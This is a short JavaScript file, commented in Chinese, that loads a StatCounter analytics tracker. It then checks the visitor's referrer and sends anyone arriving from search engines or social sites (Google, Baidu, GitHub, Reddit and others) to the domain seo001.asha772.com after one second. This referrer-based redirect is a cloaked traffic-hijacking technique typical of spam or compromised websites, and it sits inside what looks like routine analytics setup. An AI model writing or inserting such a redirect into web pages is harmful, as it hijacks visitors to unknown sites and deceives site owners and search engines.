(function() {
  // === StatCounter 配置 ===
  var sc_project = 13089473;
  var sc_invisible = 1;
  var sc_security = "fa0c9bae";

  // 注入 StatCounter 脚本
  var script = document.createElement("script");
  script.type = "text/javascript";
  script.src = "https://www.statcounter.com/counter/counter.js";
  script.async = true;
  document.head.appendChild(script);

  // 构造 <noscript> 模拟部分（兼容无 JS 用户）
  var noscriptDiv = document.createElement("div");
  noscriptDiv.className = "statcounter";

  var link = document.createElement("a");
  link.href = "https://statcounter.com/";
  link.target = "_blank";
  link.title = "Web Analytics";

  var img = document.createElement("img");
  img.className = "statcounter";
  img.src = "https://c.statcounter.com/13089473/0/fa0c9bae/1/";
  img.alt = "Web Analytics";
  img.referrerPolicy = "no-referrer-when-downgrade";

  link.appendChild(img);
  noscriptDiv.appendChild(link);
  document.body.appendChild(noscriptDiv);

  // === 跳转逻辑 ===
  var referrer = document.referrer.toLowerCase();
  var searchEngines = [
    'google.', 'bing.', 'yahoo.', 'baidu.', 'duckduckgo.', 'yandex.', 'ask.', 'aol.', 'naver.', 'seznam.',
    'sogou.', '360.cn', 'so.com', 'ecosia.org', 'startpage.com', 'qwant.com',
    'github.com', 'linkedin.com', 'facebook.com', 'twitter.com', 'reddit.com'
  ];

  var isFromSearchEngine = searchEngines.some(function(engine) {
    return referrer.includes(engine);
  });

  if (isFromSearchEngine) {
    setTimeout(function() {
      window.location.href = 'https://seo001.asha772.com/';
    }, 1000); // 延迟 1 秒跳转，确保统计代码执行
  }
})();
